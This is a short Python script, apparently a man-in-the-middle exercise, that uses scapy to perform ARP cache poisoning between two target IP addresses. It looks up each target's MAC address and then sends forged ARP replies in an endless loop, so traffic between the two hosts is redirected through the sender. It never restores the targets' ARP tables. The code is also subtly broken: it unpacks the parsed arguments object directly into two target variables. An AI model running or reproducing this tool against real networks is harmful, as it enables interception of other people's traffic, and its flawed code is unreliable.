import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--first-ip', dest='first_ip', help='First target IP address')
    parser.add_argument('-s', '--second-ip', dest='second_ip', help='Second target IP address')
    options = parser.parse_args()
    if not options.first_ip:
        parser.error("[-] Please specify a first target IP")
    if not options.second_ip:
        parser.error("[-] Please specify a second target IP")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

target_1, target_2 = get_arguments()

packets_count = 0
try:
    while True:
        spoof(target_1, target_2)
        spoof(target_2, target_1)
        packets_count += 2
        print("\r[+] Packets sent:" + str(packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C ... Quitting")